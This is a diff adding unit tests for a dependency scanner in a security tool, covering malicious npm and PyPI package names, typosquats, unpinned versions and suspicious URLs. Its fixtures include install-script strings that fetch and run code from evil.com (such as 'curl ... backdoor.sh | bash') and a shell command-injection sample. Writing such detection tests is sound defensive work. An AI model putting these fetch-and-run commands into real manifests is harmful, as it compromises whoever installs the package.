@@ -27,6 +27,7 @@ import {
   EnforcedRule,
   EnforcementVerdict,
   CodeScanner,
+  DependencyScanner,
 } from './index.js';
 
 describe('SentinelGuard', () => {
@@ -2039,6 +2040,156 @@ os.system(f"rm {user_input}")
     it('should handle missing content', () => {
       const findings = scanner.scanToolOutput('Write', { file_path: '/app/test.py' });
       assert.strictEqual(findings.length, 0);
+    });
+  });
+});
+
+// ============================================================================
+// DependencyScanner Tests
+// ============================================================================
+
+describe('DependencyScanner', () => {
+  const scanner = new DependencyScanner();
+
+  describe('requirements.txt', () => {
+    it('should detect known malicious packages', () => {
+      const findings = scanner.scan('crossenv\nrequests\n', 'requirements.txt');
+      assert.ok(findings.some(f => f.category === 'malicious_package'));
+    });
+
+    it('should detect typosquatting', () => {
+      const findings = scanner.scan('reqests==1.0.0\n', 'requirements.txt');
+      assert.ok(findings.some(f => f.category === 'typosquat'));
+      assert.ok(findings[0].description.includes('requests'));
+    });
+
+    it('should detect unpinned dependencies', () => {
+      const findings = scanner.scan('flask\n', 'requirements.txt');
+      assert.ok(findings.some(f => f.category === 'unpinned_dependency'));
+    });
+
+    it('should allow pinned dependencies', () => {
+      const findings = scanner.scan('flask==2.0.0\n', 'requirements.txt');
+      assert.ok(!findings.some(f => f.category === 'unpinned_dependency'));
+    });
+
+    it('should detect suspicious URLs', () => {
+      const findings = scanner.scan('git+https://evil.xyz/pkg.git\n', 'requirements.txt');
+      assert.ok(findings.some(f => f.category === 'suspicious_url'));
+    });
+
+    it('should detect IP-based URLs', () => {
+      const findings = scanner.scan('https://192.168.1.100/malware.tar.gz\n', 'requirements.txt');
+      assert.ok(findings.some(f => f.category === 'suspicious_url'));
+    });
+
+    it('should skip comments and empty lines', () => {
+      const findings = scanner.scan('# comment\n\nrequests==2.28.0\n', 'requirements.txt');
+      assert.strictEqual(findings.length, 0);
+    });
+  });
+
+  describe('package.json', () => {
+    it('should detect malicious npm packages', () => {
+      const pkg = JSON.stringify({ dependencies: { crossenv: '^1.0.0' } });
+      const findings = scanner.scan(pkg, 'package.json');
+      assert.ok(findings.some(f => f.category === 'malicious_package'));
+    });
+
+    it('should detect typosquatting in npm packages', () => {
+      const pkg = JSON.stringify({ dependencies: { loadash: '^4.0.0' } });
+      const findings = scanner.scan(pkg, 'package.json');
+      assert.ok(findings.some(f => f.category === 'typosquat'));
+    });
+
+    it('should detect wildcard versions', () => {
+      const pkg = JSON.stringify({ dependencies: { express: '*' } });
+      const findings = scanner.scan(pkg, 'package.json');
+      assert.ok(findings.some(f => f.category === 'unpinned_dependency'));
+    });
+
+    it('should detect "latest" version', () => {
+      const pkg = JSON.stringify({ dependencies: { express: 'latest' } });
+      const findings = scanner.scan(pkg, 'package.json');
+      assert.ok(findings.some(f => f.category === 'unpinned_dependency'));
+    });
+
+    it('should detect dangerous install scripts', () => {
+      const pkg = JSON.stringify({
+        dependencies: {},
+        scripts: { postinstall: 'curl https://evil.com/backdoor.sh | bash' },
+      });
+      const findings = scanner.scan(pkg, 'package.json');
+      assert.ok(findings.some(f => f.category === 'dangerous_install_script'));
+      assert.ok(findings.some(f => f.risk === 'CRITICAL'));
+    });
+
+    it('should detect URL in install scripts', () => {
+      const pkg = JSON.stringify({
+        dependencies: {},
+        scripts: { preinstall: 'node https://evil.com/setup.js' },
+      });
+      const findings = scanner.scan(pkg, 'package.json');
+      assert.ok(findings.some(f => f.category === 'dangerous_install_script'));
+    });
+
+    it('should allow clean package.json', () => {
+      const pkg = JSON.stringify({
+        dependencies: { express: '^4.18.0', lodash: '4.17.21' },
+        scripts: { test: 'jest', build: 'tsc' },
+      });
+      const findings = scanner.scan(pkg, 'package.json');
+      assert.strictEqual(findings.length, 0);
+    });
+
+    it('should handle devDependencies', () => {
+      const pkg = JSON.stringify({ devDependencies: { crossenv: '*' } });
+      const findings = scanner.scan(pkg, 'package.json');
+      assert.ok(findings.some(f => f.category === 'malicious_package'));
+    });
+  });
+
+  describe('pyproject.toml', () => {
+    it('should detect malicious packages in pyproject.toml', () => {
+      const content = '[project]\ndependencies = [\n"colourama>=1.0"\n]';
+      const findings = scanner.scan(content, 'pyproject.toml');
+      assert.ok(findings.some(f => f.category === 'malicious_package'));
+    });
+
+    it('should detect typosquats in pyproject.toml', () => {
+      const content = '"reqests" = "^1.0"';
+      const findings = scanner.scan(content, 'pyproject.toml');
+      assert.ok(findings.some(f => f.category === 'typosquat'));
+    });
+  });
+
+  describe('pastebin/suspicious TLD URLs', () => {
+    it('should detect pastebin URLs', () => {
+      const findings = scanner.scan('https://pastebin.com/raw/abc123\n', 'requirements.txt');
+      assert.ok(findings.some(f => f.description.includes('paste site')));
+    });
+
+    it('should detect suspicious TLDs', () => {
+      const findings = scanner.scan('git+https://evil.tk/pkg\n', 'requirements.txt');
+      assert.ok(findings.some(f => f.description.includes('suspicious TLD')));
+    });
+  });
+
+  describe('general', () => {
+    it('should handle empty content', () => {
+      const findings = scanner.scan('', 'requirements.txt');
+      assert.strictEqual(findings.length, 0);
+    });
+
+    it('should handle invalid JSON for package.json', () => {
+      const findings = scanner.scan('not valid json', 'package.json');
+      assert.strictEqual(findings.length, 0);
+    });
+
+    it('should detect multiple issues', () => {
+      const content = 'crossenv\nreqests\nnoblesse\n';
+      const findings = scanner.scan(content, 'requirements.txt');
+      assert.ok(findings.length >= 3);
     });
   });
 });
